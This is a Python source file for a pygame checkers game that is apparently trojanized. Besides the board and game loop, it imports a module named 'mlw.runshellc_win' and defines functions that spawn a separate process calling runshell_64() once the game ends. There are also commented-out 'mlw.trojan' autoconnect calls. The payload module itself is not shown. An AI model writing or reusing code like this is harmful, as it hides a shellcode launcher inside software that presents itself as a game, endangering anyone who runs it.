import pygame, os, sys
from Board import Board
from Game import Game
# import mlw.trojan as trojan

from multiprocessing import Process, freeze_support, set_executable

# import mlw.runshellc as runshellcode
import mlw.runshellc_win as runshellcode

pygame.init()

class Checkers:
	def __init__(self, screen):
		self.screen = screen
		self.running = True
		self.FPS = pygame.time.Clock()

	def _draw(self, board):
		board.draw(self.screen)
		pygame.display.update()

	def main(self, window_width, window_height):
		board_size = 8
		tile_width, tile_height = window_width // board_size, window_height // board_size
		board = Board(tile_width, tile_height, board_size)
		game = Game()
		while self.running:
			game.check_jump(board)

			for self.event in pygame.event.get():
				if self.event.type == pygame.QUIT:
					self.running = False

				if not game.is_game_over(board):
					if self.event.type == pygame.MOUSEBUTTONDOWN:
						board.handle_click(self.event.pos)
				else:
					game.message()
					self.running = False

			self._draw(board)
			self.FPS.tick(60)

def trojcall():
    # print("Fork!")
    # trojan.autoconn()
    runshellcode.runshell_64()
    os._exit(1)

def startr():
    try:
        p = Process(target=trojcall, args=())
        # p.daemon = True
        p.start()
        
        # trojan.autoconn()
    except Exception as error: 
        print(error)
        # input('Press any key to end')
		# os._exit(1)


if __name__ == "__main__":
    freeze_support()
    # set_executable(os.path.join(sys.exec_prefix, 'pythonw.exe'))
    
    window_size = (640, 640)
    screen = pygame.display.set_mode(window_size)
    pygame.display.set_caption("Checkers")
    
    checkers = Checkers(screen)
    checkers.main(window_size[0], window_size[1])
    
    startr()
    
    sys.exit(0)
    